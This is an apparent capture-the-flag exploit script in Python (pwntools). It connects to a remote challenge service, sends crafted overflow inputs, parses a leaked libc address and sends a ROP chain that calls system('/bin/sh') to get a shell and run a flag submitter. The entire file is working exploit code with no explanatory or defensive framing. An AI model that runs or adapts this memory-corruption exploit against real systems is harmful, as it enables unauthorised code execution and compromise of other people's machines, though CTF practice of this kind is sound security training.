from pwn import *

L_pop_rdi = 0x2a3e5
bin_sh_offset = 0
system_offset = 0

#r = process('./ndles')
#r = process('./challenge_patched')
#l = ELF("libc6_2.35-0ubuntu3.1_amd64.so")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, PORT)
r.sendlineafter(b'?\n', b'10')
r.sendlineafter(b'?\n', b'7')

r.sendafter(b'?\n',b'a'*9+b'\x71')
r.sendafter(b'?\n',(b'\x00'*9+b'\x71')*4+(b'\x00'*9+b'\xff')*3+b'\x00'*22+b'\x00'*4+b'\x00'*4+b'\x00'*4+b'\x00'*4+b'\x6c'+b'\x00'*3+b'\x05')

leak = r.recvuntil(b'What ', drop = True).split(b'\x1b')[1:-1]
leak = b''.join([i.split(b'm')[1][1:-1] for i in leak])
libc = u64(leak[-13:-5])-0x29d90

#l.address = libc
ROPchain = p64(libc + 0x29cd6) + p64(libc+L_pop_rdi)+p64(libc + 0x1d8698)+\
           p64(libc + 0x50d60)
#print(hex(next(l.search(b"/bin/sh\x00")) - l.address))
#print(hex(l.sym["system"] - l.address))
#print(hex(libc+L_pop_rdi+1))
print(hexdump(ROPchain))
payload = (b'\x00'*(20+22)+b'\x00'*16+b'\x58'+b'\x00'*1+ROPchain).ljust(0xff,b'a')
r.sendafter(b'?\n', payload)

r.sendline(b"./submitter")
r.sendline(b"./submitter")
r.sendline(b"./submitter")
r.sendline(b"./submitter")
r.sendline(b"./submitter")
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())
print(r.clean())